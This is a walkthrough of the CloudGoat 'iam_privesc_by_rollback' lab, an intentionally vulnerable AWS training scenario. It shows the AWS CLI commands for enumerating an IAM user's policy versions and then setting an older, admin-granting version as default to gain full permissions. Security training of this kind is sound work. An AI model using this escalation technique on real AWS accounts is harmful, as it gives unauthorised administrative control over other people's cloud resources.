Configure an AWS profile with the access tokens and perform basic enumeration.
```bash
aws configure --profile cloudgoat

export AWS_PROFILE=cloudgoat

aws sts get-caller-identity
# "Arn": "arn:aws:iam::0123456789:user/raynor-iam_privesc_by_rollback_cgidtm8l3zv490"
```

The ARN contains the username in the after `:user/`, it will be unique in each deployment.
I'll export it as an environment variable to make the cheat sheet clearer. `export IAM_USERNAME=raynor-iam_privesc_by_rollback_cgidtm8l3zv490`


List the policies attacked to the IAM user
```bash
aws iam list-user-policies --user-name $IAM_USERNAME
# None

aws iam list-attached-user-policies --user-name $IAM_USERNAME
# "PolicyName": "cg-raynor-policy-iam_privesc_by_rollback_cgidtm8l3zv490"
# "PolicyArn": "arn:aws:iam::0123456789:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidtm8l3zv490"
```

export the ARN to another environment variable `export IAM_POLICY_ARN=arn:aws:iam::0123456789:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidtm8l3zv490`


View the different versions on the IAM policy. This feature allows tracking changes made to the policy.

```bash
aws iam list-policy-versions --policy-arn $IAM_POLICY_ARN
# Shows five versions

aws iam get-policy-version --policy-arn $IAM_POLICY_ARN --version-id v1
# v1 is the default version, the permissions currently granted to the user
```

The policy below is the v1 version, it grants "read" access (list & get) as well as the power to switch between versions of policies.

```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "iam:Get*",
                        "iam:List*",
                        "iam:SetDefaultPolicyVersion"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": true
    }
}
```

Looking through the different policy versions `v3` has the following statement.

```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": "*",
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v3",
        "IsDefaultVersion": false
    }
}
```

Breaking this apart it grants all actions (`"Action": "*"`) to all resources. Since the current policy version grants the ability to change versions let switch to use this.

```bash
aws iam set-default-policy-version --policy-arn $IAM_POLICY_ARN --version-id v3
```

We now have **administrative permissions** and have completed the CloudGoat scenario!